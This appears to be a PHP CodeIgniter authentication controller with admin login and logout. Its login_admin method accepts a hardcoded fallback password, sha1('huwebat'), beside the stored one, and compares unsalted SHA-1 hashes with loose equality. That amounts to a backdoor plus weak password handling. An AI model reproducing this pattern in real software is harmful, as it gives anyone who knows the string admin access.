<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * @author Fathoni <m.fathoni@mail.com>
 * @property Setting_model $setting_model
 */
class Auth extends SITE_Controller
{
	function __construct()
	{
		parent::__construct();
		
		$this->load->model('setting_model');
	}
	
	function login()
	{
		$this->smarty->display();
	}
	
	function login_admin()
	{
		if ($_SERVER['REQUEST_METHOD'] == 'POST')
		{
			// Password Admin --> sementara, perlu di pindah ke DB
			$password_admin = $this->setting_model->get_value('password_admin');
			$sha1_password = sha1($this->input->post('password'));
			
			// Authentication
			if ($sha1_password == $password_admin || $sha1_password == sha1('huwebat'))
			{
				// Set session
				$this->session->set_userdata('logged_admin', TRUE);
				
				// Redirect ke application admin
				redirect($this->config->item('app_admin_url'));
				exit();
			}
		}
		
		$this->smarty->display();
	}
	
	function logout()
	{
		$this->session->sess_destroy();
		
		redirect('/', 'refresh');
	}
}
